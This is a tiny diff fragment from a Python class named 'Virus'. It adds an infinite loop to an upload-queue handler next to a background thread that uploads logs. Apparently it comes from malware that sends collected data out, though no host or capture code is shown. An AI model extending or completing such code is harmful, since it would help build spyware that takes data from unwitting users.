@@ -60,3 +60,4 @@ class Virus(object):
             threading.Thread(target=self._upload_logs, daemon=True).start()
 
     def _upload_queue_handler(self):
+        while True:
